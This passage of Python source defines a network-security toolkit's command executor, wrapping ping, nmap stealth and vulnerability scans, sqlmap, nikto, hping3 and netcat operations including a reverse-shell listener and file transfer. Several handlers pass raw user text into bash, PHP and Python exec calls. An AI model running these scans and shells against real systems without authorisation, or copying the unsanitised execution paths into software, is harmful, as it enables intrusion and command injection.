                logger.error(f"Logged IPs monitor error: {e}")
                time.sleep(10)
    
    def _create_threat_alert(self, threat_type: str, source_ip: str, 
                            severity: str, description: str, action_taken: str):
        """Create and log threat alert"""
        alert = ThreatAlert(
            timestamp=datetime.datetime.now().isoformat(),
            threat_type=threat_type,
            source_ip=source_ip,
            severity=severity,
            description=description,
            action_taken=action_taken
        )
        
        if self.db:
            self.db.log_threat(alert)
        
        # Log to console
        log_msg = f"🚨 THREAT ALERT: {threat_type} from {source_ip} ({severity})"
        if severity == "high":
            logger.error(log_msg)
        elif severity == "medium":
            logger.warning(log_msg)
        else:
            logger.info(log_msg)
        
        return alert
    
    def detect_ddos(self, packets_per_second: int) -> bool:
        """Detect DDoS attack based on packet rate"""
        return packets_per_second > self.thresholds['ddos']
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'monitored_ips': list(self.monitored_ips),
            'thresholds': self.thresholds,
            'threads_running': len([t for t in self.threads if t.is_alive()])
        }

# ============================================================================
# COMMAND EXECUTOR (500+ COMMANDS)
# ============================================================================

class CommandExecutor:
    """Command executor with 500+ commands support including Netcat"""
    
    def __init__(self, db_manager: DatabaseManager = None):
        self.db = db_manager
        self.netcat_manager = NetcatManager(db_manager)
        
        # Setup command map
        self.command_map = self._setup_command_map()
        
        # Command categories for help
        self.categories = {
            'ping': 'Network ping commands',
            'scan': 'Port scanning and reconnaissance',
            'traceroute': 'Network path tracing',
            'web': 'Web and HTTP tools',
            'ssh': 'SSH connections and tunneling',
            'traffic': 'Network traffic generation and testing',
            'info': 'DNS, WHOIS, and information gathering',
            'system': 'System monitoring and information',
            'transfer': 'File transfer commands',
            'security': 'Security testing tools',
            'misc': 'Miscellaneous utilities',
            'netcat': 'Netcat commands (50+ variations)'
        }
    
    def _setup_command_map(self) -> Dict[str, callable]:
        """Setup command execution map"""
        return {
            # Ping commands
            'ping': self._execute_ping,
            'ping4': self._execute_ping,
            'ping6': self._execute_ping6,
            
            # Scan commands
            'scan': self._execute_scan,
            'nmap': self._execute_nmap,
            'portscan': self._execute_portscan,
            'quick_scan': self._execute_quick_scan,
            'deep_scan': self._execute_deep_scan,
            'stealth_scan': self._execute_stealth_scan,
            'vuln_scan': self._execute_vuln_scan,
            'full_scan': self._execute_full_scan,
            'network_discovery': self._execute_network_discovery,
            
            # Traceroute commands
            'traceroute': self._execute_traceroute,
            'tracert': self._execute_traceroute,
            'mtr': self._execute_mtr,
            'tracepath': self._execute_tracepath,
            
            # Web commands
            'curl': self._execute_curl,
            'wget': self._execute_wget,
            'http': self._execute_http,
            
            # SSH commands
            'ssh': self._execute_ssh,
            'scp': self._execute_scp,
            
            # Traffic commands
            'iperf': self._execute_iperf,
            'iperf3': self._execute_iperf3,
            'hping3': self._execute_hping3,
            'ab': self._execute_ab,
            'siege': self._execute_siege,
            'tcpdump': self._execute_tcpdump,
            
            # Info commands
            'whois': self._execute_whois,
            'dig': self._execute_dig,
            'nslookup': self._execute_nslookup,
            'host': self._execute_host,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'analyze': self._execute_analyze,
            
            # System commands
            'netstat': self._execute_netstat,
            'ss': self._execute_ss,
            'ifconfig': self._execute_ifconfig,
            'ip': self._execute_ip,
            'ps': self._execute_ps,
            'top': self._execute_top,
            'free': self._execute_free,
            'df': self._execute_df,
            'uptime': self._execute_uptime,
            
            # Transfer commands
            'rsync': self._execute_rsync,
            'ftp': self._execute_ftp,
            
            # Security commands
            'nikto': self._execute_nikto,
            'sqlmap': self._execute_sqlmap,
            'gobuster': self._execute_gobuster,
            'dirb': self._execute_dirb,
            
            # Netcat commands
            'nc': self._execute_nc,
            'netcat': self._execute_nc,
            'nc_listen': self._execute_nc_listen,
            'nc_connect': self._execute_nc_connect,
            'nc_port_scan': self._execute_nc_port_scan,
            'nc_file_receive': self._execute_nc_file_receive,
            'nc_file_send': self._execute_nc_file_send,
            'nc_banner_grab': self._execute_nc_banner_grab,
            'nc_http_get': self._execute_nc_http_get,
            'nc_reverse_shell': self._execute_nc_reverse_shell,
            'nc_chat_server': self._execute_nc_chat_server,
            
            # Misc commands
            'telnet': self._execute_telnet,
            'openssl': self._execute_openssl,
            'hash': self._execute_hash,
            'base64': self._execute_base64,
            'python': self._execute_python,
            'bash': self._execute_bash,
            'php': self._execute_php,
            
            # System info
            'system': self._execute_system,
            'network': self._execute_network,
            'status': self._execute_status,
            'metrics': self._execute_metrics,
            'history': self._execute_history,
            'scans': self._execute_scans,
            'threats': self._execute_threats,
            'report': self._execute_report,
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        # Parse command
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        # Log command
        if self.db:
            self.db.log_command(command, source, True)
        
        # Execute command
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                # Try as generic shell command
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            
            # Update command log with execution time
            if self.db:
                self.db.log_command(command, source, result.get('success', False), 
                                  result.get('output', '')[:5000], execution_time)
            
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            
            if self.db:
                self.db.log_command(command, source, False, error_msg, execution_time)
            
            return self._create_result(False, error_msg, execution_time)
    
    def get_help(self, category: str = None) -> Dict[str, Any]:
        """Get help for commands"""
        if category:
            if category.lower() == 'all':
                # Get all commands by category
                help_text = {}
                for cat_name, cat_desc in self.categories.items():
                    templates = self.db.get_command_templates(cat_name) if self.db else []
                    netcat_templates = self.db.get_netcat_templates() if cat_name == 'netcat' and self.db else []
                    all_templates = templates + netcat_templates
                    
                    help_text[cat_name] = {
                        'description': cat_desc,
                        'commands': [t['usage'] for t in all_templates[:10]]  # First 10
                    }
                return self._create_result(True, help_text)
            else:
                # Get specific category
                if category == 'netcat' and self.db:
                    templates = self.db.get_netcat_templates()
                else:
                    templates = self.db.get_command_templates(category) if self.db else []
                
                if templates:
                    commands = [t['usage'] for t in templates]
                    return self._create_result(True, {
                        'category': category,
                        'description': self.categories.get(category, 'Unknown category'),
                        'commands': commands
                    })
                else:
                    return self._create_result(False, f"No commands found for category: {category}")
        else:
            # Show available categories
            return self._create_result(True, {
                'categories': self.categories,
                'total_commands': sum(len(self.db.get_command_templates(cat)) if self.db else 0 
                                     for cat in self.categories) + 
                                 (len(self.db.get_netcat_templates()) if self.db else 0)
            })
    
    def _create_result(self, success: bool, data: Any, 
                      execution_time: float = 0.0) -> Dict[str, Any]:
        """Create standardized result dictionary"""
        if isinstance(data, str):
            return {
                'success': success,
                'output': data,
                'execution_time': execution_time
            }
        else:
            return {
                'success': success,
                'data': data,
                'execution_time': execution_time
            }
    
    # ==================== COMMAND HANDLERS ====================
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        """Execute ping command"""
        if not args:
            return self._create_result(False, "Usage: ping <target> [options]")
        
        target = args[0]
        
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '4', target]
            else:
                cmd = ['ping', '-c', '4', target]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                return self._create_result(True, result.stdout)
            else:
                return self._create_result(False, result.stderr)
                
        except Exception as e:
            return self._create_result(False, f"Ping error: {str(e)}")
    
    def _execute_ping6(self, args: List[str]) -> Dict[str, Any]:
        """Execute IPv6 ping"""
        if not args:
            return self._create_result(False, "Usage: ping6 <target>")
        
        # For IPv6 ping, we need to modify the command slightly
        target = args[0]
        if platform.system().lower() == 'windows':
            cmd = ['ping', '-6', target]
        else:
            cmd = ['ping6', target]
        
        cmd.extend(args[1:])
        return self._execute_generic(' '.join(cmd))
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute scan command"""
        return self._create_result(False, "Use specific scan commands: quick_scan, deep_scan, etc.")
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        """Execute nmap command"""
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        
        return self._execute_generic('nmap ' + ' '.join(args))
    
    def _execute_portscan(self, args: List[str]) -> Dict[str, Any]:
        """Execute port scan"""
        return self._execute_scan(args)
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute quick scan"""
        if not args:
            return self._create_result(False, "Usage: quick_scan <target>")
        
        target = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.perform_nmap_scan(target, 'quick')
        
        if result.success:
            return self._create_result(True, f"Quick scan completed in {result.execution_time:.2f}s\nOpen ports: {len([p for p in result.result.get('ports', []) if p['state'] == 'open'])}")
        else:
            return self._create_result(False, f"Quick scan failed: {result.raw_output}")
    
    def _execute_deep_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute deep scan"""
        if not args:
            return self._create_result(False, "Usage: deep_scan <target>")
        
        target = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.perform_nmap_scan(target, 'comprehensive')
        
        if result.success:
            return self._create_result(True, f"Deep scan completed in {result.execution_time:.2f}s")
        else:
            return self._create_result(False, f"Deep scan failed: {result.raw_output}")
    
    def _execute_stealth_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute stealth scan"""
        if not args:
            return self._create_result(False, "Usage: stealth_scan <target>")
        
        target = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.stealth_scan(target)
        
        if result['success']:
            return self._create_result(True, f"Stealth scan completed in {result['execution_time']:.2f}s")
        else:
            return self._create_result(False, f"Stealth scan failed: {result['error']}")
    
    def _execute_vuln_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute vulnerability scan"""
        if not args:
            return self._create_result(False, "Usage: vuln_scan <target>")
        
        target = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.perform_nmap_scan(target, 'vulnerability')
        
        if result.success:
            vuln_count = len(result.vulnerabilities)
            return self._create_result(True, f"Vulnerability scan completed in {result.execution_time:.2f}s\nFound {vuln_count} potential vulnerabilities")
        else:
            return self._create_result(False, f"Vulnerability scan failed: {result.raw_output}")
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute full scan"""
        if not args:
            return self._create_result(False, "Usage: full_scan <target>")
        
        target = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.perform_nmap_scan(target, 'full')
        
        if result.success:
            open_ports = len([p for p in result.result.get('ports', []) if p['state'] == 'open'])
            return self._create_result(True, f"Full scan completed in {result.execution_time:.2f}s\nOpen ports: {open_ports}")
        else:
            return self._create_result(False, f"Full scan failed: {result.raw_output}")
    
    def _execute_network_discovery(self, args: List[str]) -> Dict[str, Any]:
        """Execute network discovery"""
        if not args:
            return self._create_result(False, "Usage: network_discovery <network_range>")
        
        network_range = args[0]
        scanner = AdvancedNetworkScanner(self.db)
        result = scanner.network_discovery(network_range)
        
        if result['success']:
            return self._create_result(True, f"Network discovery completed in {result['execution_time']:.2f}s\nHosts found: {result['count']}")
        else:
            return self._create_result(False, f"Network discovery failed: {result['error']}")
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Execute traceroute"""
        if not args:
            return self._create_result(False, "Usage: traceroute <target> [options]")
        
        target = args[0]
        traceroute = EnhancedTracerouteTool(self.db)
        result = traceroute.interactive_traceroute(target)
        return self._create_result(True, result)
    
    def _execute_mtr(self, args: List[str]) -> Dict[str, Any]:
        """Execute MTR"""
        if not args:
            return self._create_result(False, "Usage: mtr <target>")
        
        return self._execute_generic('mtr ' + ' '.join(args))
    
    def _execute_tracepath(self, args: List[str]) -> Dict[str, Any]:
        """Execute tracepath"""
        if not args:
            return self._create_result(False, "Usage: tracepath <target>")
        
        return self._execute_generic('tracepath ' + ' '.join(args))
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        """Execute curl command"""
        if not args:
            return self._create_result(False, "Usage: curl <url> [options]")
        
        return self._execute_generic('curl ' + ' '.join(args))
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        """Execute wget command"""
        if not args:
            return self._create_result(False, "Usage: wget <url> [options]")
        
        return self._execute_generic('wget ' + ' '.join(args))
    
    def _execute_http(self, args: List[str]) -> Dict[str, Any]:
        """Execute HTTP request"""
        if not args:
            return self._create_result(False, "Usage: http <url> [method]")
        
        url = args[0]
        method = 'GET'
        if len(args) > 1:
            method = args[1].upper()
        
        try:
            response = requests.request(method, url, timeout=10)
            result = {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:1000] + ('...' if len(response.text) > 1000 else ''),
                'size': len(response.content)
            }
            return self._create_result(True, result)
        except Exception as e:
            return self._create_result(False, f"HTTP request failed: {e}")
    
    def _execute_ssh(self, args: List[str]) -> Dict[str, Any]:
        """Execute SSH command"""
        if not args:
            return self._create_result(False, "Usage: ssh <host> [options]")
        
        return self._execute_generic('ssh ' + ' '.join(args))
    
    def _execute_scp(self, args: List[str]) -> Dict[str, Any]:
        """Execute SCP command"""
        if not args:
            return self._create_result(False, "Usage: scp <source> <destination>")
        
        return self._execute_generic('scp ' + ' '.join(args))
    
    def _execute_iperf(self, args: List[str]) -> Dict[str, Any]:
        """Execute iperf command"""
        if not args:
            return self._create_result(False, "Usage: iperf -c <server> [options]")
        
        return self._execute_generic('iperf ' + ' '.join(args))
    
    def _execute_iperf3(self, args: List[str]) -> Dict[str, Any]:
        """Execute iperf3 command"""
        if not args:
            return self._create_result(False, "Usage: iperf3 -c <server> [options]")
        
        return self._execute_generic('iperf3 ' + ' '.join(args))
    
    def _execute_hping3(self, args: List[str]) -> Dict[str, Any]:
        """Execute hping3 command"""
        if not args:
            return self._create_result(False, "Usage: hping3 <target> [options]")
        
        return self._execute_generic('hping3 ' + ' '.join(args))
    
    def _execute_ab(self, args: List[str]) -> Dict[str, Any]:
        """Execute Apache Bench command"""
        if not args:
            return self._create_result(False, "Usage: ab [options] <url>")
        
        return self._execute_generic('ab ' + ' '.join(args))
    
    def _execute_siege(self, args: List[str]) -> Dict[str, Any]:
        """Execute siege command"""
        if not args:
            return self._create_result(False, "Usage: siege [options] <url>")
        
        return self._execute_generic('siege ' + ' '.join(args))
    
    def _execute_tcpdump(self, args: List[str]) -> Dict[str, Any]:
        """Execute tcpdump command"""
        if not args:
            return self._create_result(False, "Usage: tcpdump [options]")
        
        return self._execute_generic('tcpdump ' + ' '.join(args))
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        """Execute whois command"""
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        
        if not WHOIS_AVAILABLE:
            return self._create_result(False, "WHOIS not available. Install with: pip install python-whois")
        
        try:
            import whois
            result = whois.whois(args[0])
            return self._create_result(True, str(result))
        except Exception as e:
            return self._create_result(False, f"WHOIS error: {str(e)}")
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        """Execute dig command"""
        if not args:
            return self._execute_generic('dig')
        
        return self._execute_generic('dig ' + ' '.join(args))
    
    def _execute_nslookup(self, args: List[str]) -> Dict[str, Any]:
        """Execute nslookup command"""
        if not args:
            return self._execute_generic('nslookup')
        
        return self._execute_generic('nslookup ' + ' '.join(args))
    
    def _execute_host(self, args: List[str]) -> Dict[str, Any]:
        """Execute host command"""
        if not args:
            return self._create_result(False, "Usage: host <domain>")
        
        return self._execute_generic('host ' + ' '.join(args))
    
    def _execute_dns(self, args: List[str]) -> Dict[str, Any]:
        """Execute DNS lookup"""
        return self._execute_host(args)
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        """Get IP location"""
        if not args:
            return self._create_result(False, "Usage: location <ip>")
        
        try:
            response = requests.get(f"http://ip-api.com/json/{args[0]}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return self._create_result(True, json.dumps(data, indent=2))
                else:
                    return self._create_result(False, f"Location lookup failed: {data.get('message')}")
            else:
                return self._create_result(False, f"HTTP error: {response.status_code}")
        except Exception as e:
            return self._create_result(False, f"Location error: {str(e)}")
    
    def _execute_analyze(self, args: List[str]) -> Dict[str, Any]:
        """Analyze IP"""
        if not args:
            return self._create_result(False, "Usage: analyze <ip>")
        
        ip = args[0]
        result = {"ip": ip, "checks": []}
        
        # Ping check
        ping_result = self._execute_ping([ip])
        result["checks"].append({"ping": "Reachable" if ping_result['success'] else "Unreachable"})
        
        # Location check
        location_result = self._execute_location([ip])
        if location_result['success']:
            result["checks"].append({"location": "Found"})
        
        # Quick port scan
        scanner = AdvancedNetworkScanner(self.db)
        scan_result = scanner.perform_nmap_scan(ip, 'quick')
        if scan_result.success:
            open_ports = len([p for p in scan_result.result.get('ports', []) if p['state'] == 'open'])
            result["checks"].append({"ports": f"{open_ports} open ports"})
        
        return self._create_result(True, json.dumps(result, indent=2))
    
    def _execute_netstat(self, args: List[str]) -> Dict[str, Any]:
        """Execute netstat command"""
        return self._execute_generic('netstat ' + ' '.join(args))
    
    def _execute_ss(self, args: List[str]) -> Dict[str, Any]:
        """Execute ss command"""
        return self._execute_generic('ss ' + ' '.join(args))
    
    def _execute_ifconfig(self, args: List[str]) -> Dict[str, Any]:
        """Execute ifconfig command"""
        return self._execute_generic('ifconfig ' + ' '.join(args))
    
    def _execute_ip(self, args: List[str]) -> Dict[str, Any]:
        """Execute ip command"""
        return self._execute_generic('ip ' + ' '.join(args))
    
    def _execute_ps(self, args: List[str]) -> Dict[str, Any]:
        """Execute ps command"""
        return self._execute_generic('ps ' + ' '.join(args))
    
    def _execute_top(self, args: List[str]) -> Dict[str, Any]:
        """Execute top command"""
        return self._execute_generic('top ' + ' '.join(args))
    
    def _execute_free(self, args: List[str]) -> Dict[str, Any]:
        """Execute free command"""
        return self._execute_generic('free ' + ' '.join(args))
    
    def _execute_df(self, args: List[str]) -> Dict[str, Any]:
        """Execute df command"""
        return self._execute_generic('df ' + ' '.join(args))
    
    def _execute_uptime(self, args: List[str]) -> Dict[str, Any]:
        """Execute uptime command"""
        return self._execute_generic('uptime ' + ' '.join(args))
    
    def _execute_rsync(self, args: List[str]) -> Dict[str, Any]:
        """Execute rsync command"""
        if not args:
            return self._create_result(False, "Usage: rsync <source> <destination>")
        
        return self._execute_generic('rsync ' + ' '.join(args))
    
    def _execute_ftp(self, args: List[str]) -> Dict[str, Any]:
        """Execute FTP command"""
        if not args:
            return self._create_result(False, "Usage: ftp <host>")
        
        return self._execute_generic('ftp ' + ' '.join(args))
    
    def _execute_nikto(self, args: List[str]) -> Dict[str, Any]:
        """Execute nikto command"""
        if not args:
            return self._create_result(False, "Usage: nikto -h <host>")
        
        return self._execute_generic('nikto ' + ' '.join(args))
    
    def _execute_sqlmap(self, args: List[str]) -> Dict[str, Any]:
        """Execute sqlmap command"""
        if not args:
            return self._create_result(False, "Usage: sqlmap -u <url>")
        
        return self._execute_generic('sqlmap ' + ' '.join(args))
    
    def _execute_gobuster(self, args: List[str]) -> Dict[str, Any]:
        """Execute gobuster command"""
        if not args:
            return self._create_result(False, "Usage: gobuster <mode> [options]")
        
        return self._execute_generic('gobuster ' + ' '.join(args))
    
    def _execute_dirb(self, args: List[str]) -> Dict[str, Any]:
        """Execute dirb command"""
        if not args:
            return self._create_result(False, "Usage: dirb <url>")
        
        return self._execute_generic('dirb ' + ' '.join(args))
    
    # ==================== NETCAT COMMANDS ====================
    
    def _execute_nc(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat command"""
        if not args:
            return self._create_result(False, "Usage: nc [options]")
        
        return self._execute_generic('nc ' + ' '.join(args))
    
    def _execute_nc_listen(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat listen"""
        if len(args) < 1:
            return self._create_result(False, "Usage: nc_listen <port> [verbose] [keep_alive]")
        
        port = int(args[0])
        verbose = len(args) > 1 and args[1].lower() in ['true', 'yes', '1', 'v', 'verbose']
        keep_alive = len(args) > 2 and args[2].lower() in ['true', 'yes', '1', 'k', 'keep']
        
        result = self.netcat_manager.listen(port, verbose, keep_alive)
        return self._create_result(result.get('success', False), result.get('output', ''))
    
    def _execute_nc_connect(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat connect"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_connect <host> <port> [verbose] [timeout]")
        
        host = args[0]
        port = int(args[1])
        verbose = len(args) > 2 and args[2].lower() in ['true', 'yes', '1', 'v', 'verbose']
        timeout = int(args[3]) if len(args) > 3 and args[3].isdigit() else 10
        
        result = self.netcat_manager.connect(host, port, verbose, timeout)
        return self._create_result(result.get('success', False), result.get('output', ''))
    
    def _execute_nc_port_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat port scan"""
        if len(args) < 3:
            return self._create_result(False, "Usage: nc_port_scan <host> <start_port> <end_port> [verbose]")
        
        host = args[0]
        start_port = int(args[1])
        end_port = int(args[2])
        verbose = len(args) > 3 and args[3].lower() in ['true', 'yes', '1', 'v', 'verbose']
        
        result = self.netcat_manager.port_scan(host, start_port, end_port, verbose)
        return self._create_result(result.get('success', False), json.dumps(result, indent=2))
    
    def _execute_nc_file_receive(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat file receive"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_file_receive <port> <filename>")
        
        port = int(args[0])
        filename = args[1]
        
        result = self.netcat_manager.file_transfer_receive(port, filename)
        return self._create_result(result.get('success', False), 
                                 f"File receive: {result.get('filename')} ({result.get('file_size', 0)} bytes)")
    
    def _execute_nc_file_send(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat file send"""
        if len(args) < 3:
            return self._create_result(False, "Usage: nc_file_send <host> <port> <filename>")
        
        host = args[0]
        port = int(args[1])
        filename = args[2]
        
        result = self.netcat_manager.file_transfer_send(host, port, filename)
        return self._create_result(result.get('success', False), 
                                 f"File send: {result.get('filename')} ({result.get('file_size', 0)} bytes)")
    
    def _execute_nc_banner_grab(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat banner grab"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_banner_grab <host> <port>")
        
        host = args[0]
        port = int(args[1])
        
        result = self.netcat_manager.banner_grab(host, port)
        return self._create_result(result.get('success', False), result.get('banner', ''))
    
    def _execute_nc_http_get(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat HTTP GET"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_http_get <host> <port> [path]")
        
        host = args[0]
        port = int(args[1])
        path = args[2] if len(args) > 2 else "/"
        
        result = self.netcat_manager.http_get(host, path, port)
        return self._create_result(result.get('success', False), result.get('response', ''))
    
    def _execute_nc_reverse_shell(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat reverse shell"""
        if len(args) < 1:
            return self._create_result(False, "Usage: nc_reverse_shell <port>")
        
        port = int(args[0])
        
        result = self.netcat_manager.reverse_shell_listen(port)
        return self._create_result(result.get('success', False), result.get('output', ''))
    
    def _execute_nc_chat_server(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat chat server"""
        if len(args) < 1:
            return self._create_result(False, "Usage: nc_chat_server <port>")
        
        port = int(args[0])
        
        result = self.netcat_manager.chat_server(port)
        return self._create_result(result.get('success', False), result.get('output', ''))
    
    def _execute_telnet(self, args: List[str]) -> Dict[str, Any]:
        """Execute telnet command"""
        if not args:
            return self._create_result(False, "Usage: telnet <host> [port]")
        
        return self._execute_generic('telnet ' + ' '.join(args))
    
    def _execute_openssl(self, args: List[str]) -> Dict[str, Any]:
        """Execute openssl command"""
        if not args:
            return self._create_result(False, "Usage: openssl <command> [options]")
        
        return self._execute_generic('openssl ' + ' '.join(args))
    
    def _execute_hash(self, args: List[str]) -> Dict[str, Any]:
        """Execute hash command"""
        if not args:
            return self._create_result(False, "Usage: hash <algorithm> <text>")
        
        if len(args) < 2:
            return self._create_result(False, "Usage: hash <algorithm> <text>")
        
        algorithm = args[0].lower()
        text = ' '.join(args[1:])
        
        if algorithm == 'md5':
            hash_obj = hashlib.md5(text.encode())
        elif algorithm == 'sha1':
            hash_obj = hashlib.sha1(text.encode())
        elif algorithm == 'sha256':
            hash_obj = hashlib.sha256(text.encode())
        elif algorithm == 'sha512':
            hash_obj = hashlib.sha512(text.encode())
        else:
            return self._create_result(False, f"Unsupported algorithm: {algorithm}")
        
        return self._create_result(True, hash_obj.hexdigest())
    
    def _execute_base64(self, args: List[str]) -> Dict[str, Any]:
        """Execute base64 encode/decode"""
        if not args:
            return self._create_result(False, "Usage: base64 <encode|decode> <text>")
        
        if len(args) < 2:
            return self._create_result(False, "Usage: base64 <encode|decode> <text>")
        
        operation = args[0].lower()
        text = ' '.join(args[1:])
        
        try:
            if operation == 'encode':
                encoded = base64.b64encode(text.encode()).decode()
                return self._create_result(True, encoded)
            elif operation == 'decode':
                decoded = base64.b64decode(text.encode()).decode()
                return self._create_result(True, decoded)
            else:
                return self._create_result(False, f"Unknown operation: {operation}")
        except Exception as e:
            return self._create_result(False, f"Base64 operation failed: {e}")
    
    def _execute_python(self, args: List[str]) -> Dict[str, Any]:
        """Execute Python code"""
        if not args:
            return self._create_result(False, "Usage: python <code>")
        
        code = ' '.join(args)
        try:
            # Use exec to execute Python code
            # Note: This is potentially dangerous! Use with caution.
            result = {}
            exec(f"__result = {code}", {}, result)
            return self._create_result(True, str(result.get('__result', 'Executed')))
        except:
            try:
                # Try as a statement
                exec(code, {})
                return self._create_result(True, "Executed successfully")
            except Exception as e:
                return self._create_result(False, f"Python execution error: {e}")
    
    def _execute_bash(self, args: List[str]) -> Dict[str, Any]:
        """Execute bash command"""
        if not args:
            return self._create_result(False, "Usage: bash <command>")
        
        return self._execute_generic('bash -c "' + ' '.join(args) + '"')
    
    def _execute_php(self, args: List[str]) -> Dict[str, Any]:
        """Execute PHP code"""
        if not args:
            return self._create_result(False, "Usage: php <code>")
        
        code = ' '.join(args)
        return self._execute_generic(f'php -r "{code}"')
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        """Get system information"""
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'percent': psutil.virtual_memory().percent,
                'used': psutil.virtual_memory().used,
                'free': psutil.virtual_memory().free
            },
            'disk': {
                'total': psutil.disk_usage('/').total,
                'used': psutil.disk_usage('/').used,
                'free': psutil.disk_usage('/').free,
                'percent': psutil.disk_usage('/').percent
            },
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
            'users': [u.name for u in psutil.users()]
        }
        
        return self._create_result(True, info)
    
    def _execute_network(self, args: List[str]) -> Dict[str, Any]:
        """Get network information"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            interfaces = psutil.net_if_addrs()
            
            network_info = {
                'hostname': hostname,
                'local_ip': local_ip,
                'interfaces': {}
            }
            
            for iface, addrs in interfaces.items():
                network_info['interfaces'][iface] = []
                for addr in addrs:
                    network_info['interfaces'][iface].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask if hasattr(addr, 'netmask') else None,
                        'broadcast': addr.broadcast if hasattr(addr, 'broadcast') else None
                    })
            
            # Network connections
            connections = psutil.net_connections()
            network_info['connections'] = {
                'total': len(connections),
                'tcp': len([c for c in connections if c.type == socket.SOCK_STREAM]),
                'udp': len([c for c in connections if c.type == socket.SOCK_DGRAM])
            }
            
            return self._create_result(True, network_info)
        
        except Exception as e:
            return self._create_result(False, f"Failed to get network info: {e}")
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        """Get system status"""
        status = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cpu': f"{psutil.cpu_percent(interval=1)}%",
            'memory': f"{psutil.virtual_memory().percent}%",
            'disk': f"{psutil.disk_usage('/').percent}%",
            'uptime': str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())),
            'network': {
                'bytes_sent': psutil.net_io_counters().bytes_sent,
                'bytes_recv': psutil.net_io_counters().bytes_recv,
                'packets_sent': psutil.net_io_counters().packets_sent,
                'packets_recv': psutil.net_io_counters().packets_recv
            }
        }
        
        return self._create_result(True, status)
    
    def _execute_metrics(self, args: List[str]) -> Dict[str, Any]:
        """Get system metrics"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            metrics = {
                'cpu': {
                    'total': psutil.cpu_percent(),
                    'per_core': cpu_percent
                },
                'memory': {
                    'total': mem.total,
                    'available': mem.available,
                    'percent': mem.percent,
                    'used': mem.used,
                    'free': mem.free
                },
                'disk': {
                    'total': disk.total,
                    'used': disk.used,
                    'free': disk.free,
                    'percent': disk.percent
                }
            }
            
            return self._create_result(True, json.dumps(metrics, indent=2))
            
        except Exception as e:
            return self._create_result(False, f"Error getting metrics: {e}")
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        """Get command history"""
        try:
            history = self.db.get_command_history(20) if self.db else []
            
            if not history:
                return self._create_result(True, "No command history found")
            
            result = []
            for record in history:
                result.append({
                    'command': record['command'],
                    'source': record['source'],
                    'timestamp': record['timestamp'],
                    'success': bool(record['success'])
                })
            
            return self._create_result(True, json.dumps(result, indent=2))
            
        except Exception as e:
            return self._create_result(False, f"Error getting history: {e}")
    
    def _execute_scans(self, args: List[str]) -> Dict[str, Any]:
        """Get scan history"""
        try:
